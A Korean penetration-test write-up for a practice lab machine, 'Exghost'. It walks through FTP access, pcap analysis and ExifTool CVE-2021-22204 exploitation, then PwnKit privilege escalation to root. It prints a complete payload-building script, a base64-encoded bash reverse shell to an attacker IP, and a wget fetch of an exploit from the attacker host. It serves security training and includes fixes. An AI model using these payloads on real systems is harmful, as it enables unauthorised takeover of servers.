---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/svc/ftp
  - tech/web/file-upload
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.248.183
domain: exghost.local
ports: [21, 80]
services: [ftp, http]
cves: [CVE-2021-22204, CVE-2021-4034]
status: solved
manual_tags: true
manual_cves: true
tech_count: 3
---

> [!info] 요약
> 타겟 `192.168.248.183` · Ubuntu 20.04(Apache 2.4.41-Ubuntu 배너 기준) · PG Practice Pentester Foundations #7 · 플래그 2개
> 진입점: FTP 기본자격(`user:system`)으로 받은 백업 파일이 실제로는 pcap → `tshark --export-objects` 로 `/exiftest.php` + 파라미터 `myFile` + ExifTool 12.23 확인 → **CVE-2021-22204** DjVu 페이로드 업로드로 `www-data` 획득
> 권한상승: `pkexec` SUID(policykit-1 0.105) → **CVE-2021-4034 (PwnKit)** 파이썬 PoC로 root
> 시행착오·교훈 → [[_PLAYBOOK]]

> [!warning] 증거 등급 — 셸 이후 구간은 파일 근거가 없다
> **파일로 남은 구간** — 정찰(`nmap*.txt`·`ferox*.txt`·`ffuf_*`)·pcap 분석(`backup`·`http_objects/`)·페이로드 빌드(`exif/*`)·PwnKit PoC 클론(`pwnkit/`). 작업 시각은 mtime 기준 2026-08-19 20:35:08~21:05:12.
> **파일 근거가 없는 구간** — 업로드 트리거 이후 전부(리버스셸 연결·`www-data` 열거·PwnKit 실행·플래그 값). `harvest.sh`·`proof_*.txt`·tmux capture-pane 부재, 볼트 `파일보관\` 에 이 박스 스크린샷 0장. `~/.zsh_history` 에도 이 박스 명령이 없음(`exghost`·`192.168.248.183`·`exiftest`·`djvumake`·`tshark`·`ffuf` 전수 grep 0건 — 비대화형 파이프라인 작업 정황과 일치). 아래 타겟 셸 프롬프트·명령 출력·플래그 값은 **기존 노트 원문을 보존한 것**이며 근거등급은 `근거부족`.
> **다만 플래그 2개를 실제로 얻은 것 자체는 확인됨** — `03. PG\_AUDIT\portal-진행도-실측-20260820.md`(포털 전수 조회 실측)의 `n == m` 목록에 Exghost 가 포함돼 있어 포털 기준 **2/2 제출·인정**. 값 자체를 검증하는 근거는 아니지만, "풀지 않았다"는 해석은 이 양성 증거로 배제됨.
> **웹셸 판정** — 노트 원문의 타겟 프롬프트(`www-data@exghost:...$`)와 `pty.spawn` 기록이 대화형 셸을 가리키나 캡처 파일이 없어 **판정 불가 · 근거부족**. 웹셸이었다는 반대 증거도 없음.

## Target #1 – 192.168.248.183

### Initial Access – FTP 백업이 담고 있던 pcap으로 ExifTool DjVu RCE 엔드포인트를 복원해 RCE

**Vulnerability Explanation:**
- `/exiftest.php`가 업로드 파일을 `image/png`·`image/jpeg` MIME 화이트리스트만 검사한 뒤 `shell_exec('/var/www/html/exiftool ' . $newFilepath . ' > /var/www/html/reportsexif/' . $filename.".txt")` 로 ExifTool을 호출함 — **PHP 소스 자체는 산출물에 없고 노트 원문 재구성이라 `근거부족`.** 간접 뒷받침은 pcap 응답의 `Directory : /var/www/html/uploads` 와 `Content-Type: image/jpeg` 로 통과한 실제 업로드 요청뿐임
- ExifTool ≤12.23은 DjVu ANT(annotation) 청크를 Perl `eval`로 파싱하는 경로에 인젝션이 있음(CVE-2021-22204) — 파일을 열어 파싱하는 것만으로 임의 명령이 실행됨
- 업로드 검증은 파일의 **겉면**(확장자·MIME)만 보는데, ExifTool은 **매직 바이트로 내부 청크**를 재귀 파싱함 — 정상 JPEG 안에 DjVu ANT 청크를 EXIF 태그로 심으면 겉은 검증을 통과하고 속은 취약 경로로 들어감(파서 혼동)

**Vulnerability Fix:**
- ExifTool 12.24 이상으로 업그레이드
- 업로드 파일을 신뢰할 수 없는 파서(ExifTool 등)에 직접 넘기지 말고, 재인코딩(픽셀만 추출)한 뒤 저장
- `shell_exec`에 경로를 문자열 연결하지 말고, 불가피하면 인자를 이스케이프해 `proc_open`으로 호출. 업로드 디렉터리는 `noexec`

**Severity:** Critical — 무인증 원격 RCE(엔드포인트 자체는 로그인 불필요, FTP 자격증명은 엔드포인트를 알아내는 정찰 수단일 뿐)

**Steps to reproduce the attack:**
1. FTP `user:system` 로그인 → `backup` 파일 회수(실제로는 확장자 없는 pcap)
2. `tshark --export-objects`로 HTTP 객체 재조립 → `/exiftest.php` 엔드포인트·파라미터명 `myFile`·ExifTool 12.23 확인
3. CVE-2021-22204 DjVu 페이로드를 JPEG EXIF 커스텀 태그에 삽입해 빌드
4. `myFile=@image.jpg`로 `/exiftest.php`에 업로드 → 서버가 ExifTool로 파싱하는 순간 리버스셸 실행 → `www-data`

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.248.183 | TCP: 21, 80 |

```text
Not shown: 65532 filtered tcp ports (no-response)
PORT   STATE  SERVICE  VERSION
20/tcp closed ftp-data
21/tcp open   ftp      vsftpd 3.0.3
80/tcp open   http     Apache httpd 2.4.41
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.41 (Ubuntu)
Aggressive OS guesses: Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 4.15 - 5.19 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: 127.0.0.1; OS: Unix
```
— 출처: `~/PG/Exghost/nmap.log`(`nmap -sCV -p- -Pn -A --min-rate 5000`). `Aggressive OS guesses` 행은 원문 10개 후보 중 상위 3개만 옮김.

```text
Not shown: 2 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```
— 출처: `~/PG/Exghost/nmap_quick.txt`(`-p21,22,80,443 -sV -Pn -n --open`). 22·443 은 `--open` 때문에 행 자체가 안 찍히고 `Not shown: 2 filtered` 로만 집계됨 — "필터링 확정"이 아니라 **필터링으로 «보고»된 것**이며, 같은 파일이 `--defeat-rst-ratelimit` 캐비어트를 함께 출력함.

`nmap_allports.txt`(`-Pn -p- --min-rate 2000 -T4`)도 `20/tcp closed · 21/tcp open · 80/tcp open` 으로 동일 — 두 전수 스캔이 서로를 교차 확인함.

Apache 2.4.41-Ubuntu 패키지 버전이 focal(20.04) 전용이라는 것이 버전 판정 근거 1 — 실제 `uname -a`(원문: `5.4.0-89-generic`)는 아래 증거 캐비어트 대상이라 근거 2로 못 씀. `/` 는 403(인덱스 없음).

### Initial Access – FTP → pcap → DjVu RCE

FTP 기본 자격증명 시도 — 워드리스트 전에 흔한 조합부터:

```bash
ftp -A 192.168.248.183
```
Name: `user` / Password: `system` → `230 Login successful.` — PASV(패시브) 모드는 방화벽에 막혀 `LIST`가 타임아웃하므로 `-A`(액티브 모드) 필수. `ls` 결과 `-rwxrwxrwx 1 0 0 126151 Jan 27 2022 backup` 하나.
— 출처: `~/PG/Exghost/` 작업 기록(FTP 세션 자체는 캡처 파일 없음, `backup`·`backup.pcap` 파일의 존재와 mtime 20:37로 다운로드 성공을 확인)

```bash
file backup
```
```text
backup: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 262144)
```
— 출처: `~/PG/Exghost/backup`(126151B) — 확장자 없는 파일은 반드시 `file`로 확인. 954패킷 · 144초 · 2022-01-27 캡처.

```bash
tshark -r backup -Y http.request -T fields -e frame.number -e http.request.method -e http.host -e http.request.uri
```
```text
66	GET	127.0.0.1	/
891	POST	127.0.0.1	/exiftest.php
```
— 출처: `~/PG/Exghost/backup`. 954패킷 중 HTTP 트랜잭션은 2건뿐, 나머지는 Firefox/Ubuntu 배경 DNS 노이즈.

```bash
tshark -r backup --export-objects http,http_objects/
```
`http_objects/` 3개 회수 — `%2f`(502B, 루트 응답 HTML), `exiftest.php`(14806B, POST 멀티파트 원문), `exiftest(1).php`(1072B, 서버 응답).

업로드 폼(`%2f`):
```html
    <!-- Part from this tutorial -->
    <form method="post" action="exiftest.php" enctype="multipart/form-data">
        <input type="file" name="myFile" />
        <input type="submit" value="Upload">
    </form>
    <!-- End of part from this tutorial -->
```
— 출처: `~/PG/Exghost/http_objects/%2f`(502B 중 `<body>` 부분 발췌)

POST 멀티파트 원문(`exiftest.php`, 14806B) 헤더 — 검증을 통과한 실제 요청 형식:
```text
-----------------------------169621313238602050593908562572
Content-Disposition: form-data; name="myFile"; filename="testme.jpg"
Content-Type: image/jpeg
```
— 출처: `~/PG/Exghost/http_objects/exiftest.php` 선두. 이 본문에서 카빙된 JPEG 가 `~/PG/Exghost/uploaded_testme.jpg`(14582B, 253x257) 로 남아 있음.

서버 응답(`exiftest(1).php`) — 파라미터명·저장경로·ExifTool 버전이 한 번에 드러남:
```text
File uploaded successfully :)<pre>ExifTool Version Number         : 12.23
File Name                       : phpopnW14.jpg
Directory                       : /var/www/html/uploads
File Size                       : 14 KiB
File Modification Date/Time     : 2022:01:27 14:47:37+02:00
...
Image Size                      : 253x257
Megapixels                      : 0.065
</pre>
```
— 출처: `~/PG/Exghost/http_objects/exiftest(1).php`(1072B, 중간 EXIF 필드 15행 생략). 12.23은 CVE-2021-22204 취약 범위(7.44–12.23)의 마지막 버전. `Directory : /var/www/html/uploads` 가 업로드 저장 경로의 유일한 실측 근거.

라이브 타겟 재확인 — pcap 속 `index.html`은 캡처 당시 루프백(`127.0.0.1`)에서만 보였고 지금 `/`는 403. `/exiftest.php`는 여전히 200으로 직접 접근 가능 — pcap이 없었다면 파라미터명·버전을 알 방법이 없었다.

**pcap에서 «나오지 않은» 것** (노트 원문 기록, 스윕 로그는 미보존 · `근거부족`) — 없다도 결론이라 남김:
- 평문 자격증명 0건(`flag|passw|pwd|credential|secret|api_key|token|BEGIN PRIVATE` 스윕)
- 쿠키·`Authorization`·`Set-Cookie` 헤더 없음
- DNS 엑스필 없음 — 926개 DNS 프레임 전부 정상 배경 트래픽(고유 이름 10개)
- 트래픽 전부 `127.0.0.1` 루프백. 외부 대화·C2 없음
- 카빙한 `testme.jpg`(14582B)는 은닉 데이터 없는 평범한 테스트 이미지 — 스테가노 요소 아님

**브루트포싱은 완주하고도 0건 — pcap이 유일한 진입로였음을 뒷받침.**

| 스캔 | 워드리스트 | 완주 근거 | 결과 |
|---|---|---|---|
| `ffuf -u http://T/FUZZ -w directory-list-2.3-medium.txt -t 35 -fc 404` | 220,560줄 | `Progress: [220560/220560]` | `uploads`(301) · `server-status`(403). 나머지 15건은 워드리스트의 `#` 주석 줄이 그대로 요청된 403 |
| `ffuf -u http://T/uploads/FUZZ -w raft-medium-files.txt -e .php,.txt,.jpg,.png -t 25 -fc 404` | 85,645 | `Progress: [85645/85645]` | 전부 403(`.htaccess` 계열 53건). 유효 파일 0건 |
| `ffuf -u http://T/FUZZ -w raft-medium-files.txt -e .php,.txt,.html,.bak,.zip -t 40 -fc 404 -s` | 17,129줄×6 | **진행률 미기록** — `-s`(silent)라 `근거부족` | 결과 63건 전부 403. 200 응답 0건 |
| `feroxbuster -w raft-medium-directories.txt -x php,txt,html,bak,zip --dont-filter` | — | — | `/`·`/.php`·`/.html` 403 · `/uploads` 301. ffuf 와 동일 결론 |
| `gobuster` 디렉터리·업로드 2종 | — | — | stdout·출력파일 **전부 0바이트**. 원인 미기록 — `[가정]` |

— 출처: `~/PG/Exghost/ffuf_dirs.{txt,json}`(537206B)·`ffuf_up.{txt,json}`(299245B)·`ffuf_files.{txt,json}`·`ferox2.txt`·`gob_dirs.txt`/`gob.stdout`/`gob_uploads.txt`/`gobu.stdout`(0바이트 — 빈 결과를 받았다는 기록이지 미실행이 아님).

**핵심 실측** — `grep -ic 'exiftest'` 결과가 `directory-list-2.3-medium.txt`(220560줄) `0`, `raft-medium-files.txt`(17129줄) `0`. **`exiftest.php` 는 어느 표준 워드리스트에도 없으므로 요청 수를 아무리 늘려도 확률이 0이다.** 브루트포싱의 성공 조건은 「대상 파일명 ∈ 워드리스트」이고, 30만이라는 숫자는 커버리지의 착시만 준다. 30만 건 완주 0건이 곧 「없다」가 아니라 「워드리스트가 그 이름을 모른다」였고, 탈출구는 다른 채널(FTP 의 pcap)이었음.

`Host:` 헤더를 `exghost`·`exghost.local`·`exghost.pg` 로 바꿔도 전부 기본 vhost 403 — 숨은 가상호스트 없음(노트 원문 기록, 캡처 파일 없음 · `근거부족`). 프론트매터에서 `domain` 을 비워둔 근거가 이것임.

파라미터명은 응답 문구 차이로도 브루트포싱 가능 — `myFile`은 `File uploaded successfully :)`, 나머지 후보(`file`·`image`·`upload`…)는 `There is no file to upload.`. 응답이 입력에 따라 달라지는 지점은 전부 열거 오라클임. 이 확인의 요청·응답 로그는 미보존(`근거부족`)이고, 남은 것은 pcap 에서 카빙한 원본 업로드 이미지 `~/PG/Exghost/uploaded_testme.jpg`(14582B, mtime 20:38:10) 뿐 — 테스트 업로드에 쓰인 것으로 보이나 `[가정]`.

**Initial Access — 업로드 트리거:**

```bash
python3 exif/exp.py
```
```python
#!/usr/bin/env python3
import os, subprocess, base64, sys

LHOST = "192.168.45.207"
LPORT = "9001"
WORK  = "/home/kali/PG/Exghost/exif"

cmd = "bash -i >& /dev/tcp/%s/%s 0>&1" % (LHOST, LPORT)
b64 = base64.b64encode(cmd.encode()).decode()
runner = "echo %s|base64 -d|bash" % b64
print("[*] inner cmd :", cmd)
print("[*] runner    :", runner)

os.makedirs(WORK, exist_ok=True)
os.chdir(WORK)

with open("payload", "w") as f:
    f.write('(metadata "\c${system(\'%s\')};")' % runner)

with open("configfile", "w") as f:
    f.write("""%Image::ExifTool::UserDefined = (
    'Image::ExifTool::Exif::Main' => {
        0xc51b => {
            Name => 'HasselbladExif',
            Writable => 'string',
            WriteGroup => 'IFD0',
        },
    },
);
1; #end
""")

for c in ["bzz payload payload.bzz",
          "djvumake exploit.djvu INFO=0,0 BGjp=/dev/null ANTz=payload.bzz",
          "convert -size 64x64 xc:red base.jpg",
          "cp base.jpg image.jpg",
          "exiftool -config configfile '-HasselbladExif<=exploit.djvu' image.jpg"]:
    print("[+] " + c)
    r = subprocess.run(c, shell=True, capture_output=True, text=True)
    print(r.stdout.strip()); print(r.stderr.strip())

print("[*] result:")
print(subprocess.run("ls -la; file image.jpg", shell=True, capture_output=True, text=True).stdout)
```
— 출처: `~/PG/Exghost/exif/exp.py`(1314B, 원문 그대로). 리버스셸(`bash -i >& /dev/tcp/192.168.45.207/9001 0>&1`)을 base64로 감싸 `payload`에 삽입 — 원문에 `>`·`&`·`/`·공백이 섞여 있어 DjVu 파서→Perl `system()`으로 내려가는 여러 인용 계층을 그대로 통과하려면 base64가 필요함. `djvulibre-bin`(`bzz`·`djvumake`) 패키지 필요.

빌드된 `payload` 실물:
```text
(metadata "\c${system('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIwNy85MDAxIDA+JjE=|base64 -d|bash')};")
```
— 출처: `~/PG/Exghost/exif/payload`(109B, 전문).

빌드 산출물 — 전부 실재 확인(mtime 2026-08-19 20:38:55):

| 파일 | 크기 | `file` 판정 | 역할 |
|---|---|---|---|
| `exif/payload` | 109B | ASCII text | Perl `system()` 을 담은 DjVu ANT 주석 |
| `exif/payload.bzz` | 116B | data | `bzz` 압축본(ANTz 청크용) |
| `exif/exploit.djvu` | 166B | DjVu image or single page document | `djvumake` 로 조립한 최소 DjVu 컨테이너 |
| `exif/base.jpg` | 336B | JPEG, 64x64, components 3 | 정상 JPEG 껍데기(ImageMagick `convert`) |
| `exif/image.jpg` | 604B | JPEG + `Exif Standard: [TIFF, direntries=5]` | `base.jpg` 에 `exploit.djvu` 를 `HasselbladExif` 태그로 삽입한 최종 페이로드 |
| `exif/image.jpg_original` | 336B | JPEG(Exif 없음) | `exiftool` 이 자동 생성한 삽입 전 백업 — `base.jpg` 와 동일 크기 |

`file image.jpg` 가 `Exif Standard: [TIFF image data, big-endian, direntries=5]` 를 뱉는 것이 삽입 성공의 근거임 — `base.jpg`·`image.jpg_original` 에는 이 필드가 없음.

```bash
tmux new-session -d -s exg 'rlwrap nc -lvnp 9001'
curl -s -F 'myFile=@exif/image.jpg' http://192.168.248.183/exiftest.php
```
curl이 응답 없이 매달리는 것 자체가 성공 신호 — exiftool이 리버스셸 프로세스에 블록되어 PHP가 응답을 못 돌려줌. 이 지점부터는 파일 근거가 없음(위 경고 참고). 아래 블록은 전부 **노트 원문 보존 · `근거부족`** 이며 타겟 pty 프롬프트는 실측 표식이라 원형 그대로 둠:

```text
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.183] 39420
www-data@exghost:/var/www/html$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@exghost:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@exghost:/var/www/html$ uname -a
Linux exghost 5.4.0-89-generic #100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021 x86_64
```

user 플래그는 권한상승 전에 이미 읽힘 — 셸을 잡으면 즉시 모든 홈을 훑는 습관(`cat /home/*/local.txt 2>/dev/null`)이 여기서 그대로 통함:

```text
www-data@exghost:/var/www/html$ ls -la /home/hassan/local.txt
-rw-r--r-- 1 hassan hassan 33 ... /home/hassan/local.txt
www-data@exghost:/var/www/html$ cat /home/hassan/local.txt
025666986d0c58902b71b127c23ca5bd
```

`-rw-r--r--` = other 읽기 가능이라 권한상승을 기다릴 필요가 없음. `/home/user/` 에는 플래그 없음.

**Local.txt value:**
`025666986d0c58902b71b127c23ca5bd` — 출처: 노트 원문(재구성), `~/PG/Exghost/` 에 `proof_*.txt`·스크린샷 등 대응 파일 없음. 근거등급 `근거부족`. 다만 포털 실측(`_AUDIT\portal-진행도-실측-20260820.md`)에서 이 박스가 2/2 인정이라 **플래그를 얻은 사실 자체는 확인됨**.

### Privilege Escalation – PwnKit (CVE-2021-4034)

**Vulnerability Explanation:**
- `pkexec`(polkit SUID root 바이너리)가 `argc == 0` 호출을 처리하지 못함. `execve`로 `argv`가 빈 배열이면 `pkexec`가 `argv[1]`을 읽으려다 범위를 벗어나 `envp` 영역을 인자로 오인함
- 이 out-of-bounds 접근으로 환경변수를 재도입해 `GCONV_PATH` 조작 → 공격자 제작 공유 라이브러리를 root 권한으로 로드 → uid 0 셸
- 인증도 자격증명도 불필요한 로컬 권한상승. `policykit-1 0.105-26ubuntu1.1`(패치는 `-26ubuntu1.2`) 조합이 취약 범위

**Vulnerability Fix:**
- `policykit-1`을 `0.105-26ubuntu1.2` 이상으로 패치
- 임시조치로 `chmod 0755 /usr/bin/pkexec`(SUID 비트 제거)

**Severity:** Critical — 로컬 사용자 권한만 있으면 즉시 root

**Steps to reproduce the attack:**
1. `find / -perm -4000` 등 SUID 열거 → `pkexec` 확인, `pkexec --version`/`dpkg -l | grep policykit`로 취약 버전 확정
2. 타겟에 컴파일러가 없어 C PoC 대신 ELF 내장 파이썬 PoC(`joeammond/CVE-2021-4034`) 사용
3. Kali에서 `python3 -m http.server`로 서빙 → 타겟에서 `wget`으로 회수 → 무결성 확인
4. `python3 CVE-2021-4034.py` 실행 → uid 0

권한상승 구간도 캡처 파일이 없음 — 노트 원문 보존 · `근거부족`. 타겟 pty 프롬프트는 실측 표식이라 원형 유지.

```text
www-data@exghost:/var/www/html$ pkexec --version
pkexec version 0.105
www-data@exghost:/var/www/html$ dpkg -l | grep policykit
hi  policykit-1  0.105-26ubuntu1.1  amd64  framework for managing administrative policies and privileges
```

Kali에서 클론한 PoC는 실재함 — `~/PG/Exghost/pwnkit/CVE-2021-4034.py`(3262B). 저장소 판정 근거는 `~/PG/Exghost/pwnkit/.git/config` 의 `url = https://github.com/joeammond/CVE-2021-4034` 이고, `git log` 최상단 커밋도 `318add3 Merge pull request #1 from cclauss/patch-1` 로 그 저장소와 일치함. 디렉터리 mtime 2026-08-19 20:40:45 — 이 박스 작업 구간(20:35~21:05) 안.

`~/.zsh_history` 에는 이 clone 명령이 없음. 1208행에 동일 CVE의 clone(`berdav/CVE-2021-4034.git`)이 있으나 **다른 저장소**이고 앞뒤 문맥이 `cd Levram`·pyLoad·pluxml 이라 이 박스 것이 아님 — 저장소 URL 불일치가 결정적 근거.

전송 후 `md5sum` 대조까지 하고 실행함([[Squid]] 에서 파일이 조용히 잘려 전송된 경험 반영):

```text
www-data@exghost:/tmp$ wget -q http://192.168.45.207:8000/CVE-2021-4034.py -O /tmp/pk.py
www-data@exghost:/tmp$ md5sum /tmp/pk.py
53f43d1a285c15491ad792a100b65bb5  /tmp/pk.py
www-data@exghost:/tmp$ python3 /tmp/pk.py
[+] Creating shared library for exploit code.
[+] Calling execve()
# id
uid=0(root) gid=33(www-data) groups=33(www-data)
# cat /root/proof.txt
1861a91dda3d6102fd70b610411b8635
```
— 출처: 노트 원문(재구성), 캡처 파일 없음. `gid`가 33으로 남지만 `uid=0`이면 `/root` 읽기에 충분 — [[Levram]] 의 `cap_setuid` 와 같은 반쪽 root 형태.

### Post-Exploitation

**Proof.txt value:**
`1861a91dda3d6102fd70b610411b8635` — 출처: 노트 원문(재구성), 대응 파일·스크린샷 없음(위 경고 참고). 근거등급 `근거부족`. 플래그를 얻은 사실 자체는 포털 실측 2/2 로 확인됨.

**남긴 흔적** (노트 원문 기록, 파일 근거 없음)
- `/var/www/html/uploads/phpM114GP.jpg`(22B, 파라미터 브루트포싱용 더미) · `phpBqJPfC.jpg`(604B, CVE-2021-22204 페이로드)
- `/var/www/html/reportsexif/phpM114GP.txt` · `phpBqJPfC.txt`(0B, 트리거 시 생성)
- `/tmp/pk.py` — PwnKit 파이썬 익스플로잇
- 계정 생성·설정 변경 없음(원문 기록). Kali 쪽 리스너·tmux 세션은 종료 여부 캡처 파일 없음

## 관련

- CVE-2021-22204 (ExifTool DjVu ANT Perl injection): https://nvd.nist.gov/vuln/detail/CVE-2021-22204 · GitHub Security Lab(GHSL-2021-039)
- CVE-2021-4034 (PwnKit / pkexec): https://nvd.nist.gov/vuln/detail/CVE-2021-4034 · Qualys 원 advisory
- ELF 내장 파이썬 PoC: [joeammond/CVE-2021-4034](https://github.com/joeammond/CVE-2021-4034) — `pwnkit/.git/config` 의 remote 로 확인된 실제 클론본 · [berdav/CVE-2021-4034](https://github.com/berdav/CVE-2021-4034) 는 C 구현(대안, 타겟에 컴파일러 필요)
- pcap HTTP 객체 추출: `tshark -r <file> --export-objects http,<dir>/`
- 이 박스의 시행착오·반사 카드 — [[_PLAYBOOK#A-23. 워드리스트에 없는 파일명은 브루트포싱으로 못 찾는다]](30만 건 완주 0건과 채널 전환 우선순위) · [[_PLAYBOOK#A-12. 응답이 성공을 뜻하지 않는다]](curl 매달림 = 성공 신호) · [[_PLAYBOOK#B-29. FTP 로그인은 되는데 `LIST` 가 멈춘다 — PASV 를 의심한다]] · [[_PLAYBOOK#B-86. 타겟에 컴파일러가 없다 — C PoC 를 못 빌드한다]]
- 기법 카드 — [[_PLAYBOOK#B-2-10. 확장자 없는 백업 파일은 `file` 부터 — pcap 이면 그것이 정찰 자료다]] · [[_PLAYBOOK#B-1-20. 검증하는 파서 ≠ 처리하는 파서 — 업로드 필터는 그 틈으로 넘는다]] · 응답 문구 오라클은 [[_PLAYBOOK#B-1-11. 후보 파라미터 이름은 배치로 쏜다 — 대조군 필수]]
- [[Hawat]] · [[Exfiltrated]] — base64/hex 로 인용 중첩 회피하는 같은 계열
- [[Crane]] · [[RubyDome]] · [[Astronaut]] — "응답이 성공을 뜻하지 않는다" 누적 패턴
- [[Levram]] — uid만 0인 반쪽 root 형태(cap_setuid), PwnKit 클론이 발견된 원 작업 박스
- [[Squid]] — 전송 후 무결성(md5) 확인 습관의 근거가 된 경험
- [[Hub]] — 같은 컬렉션 앞 박스
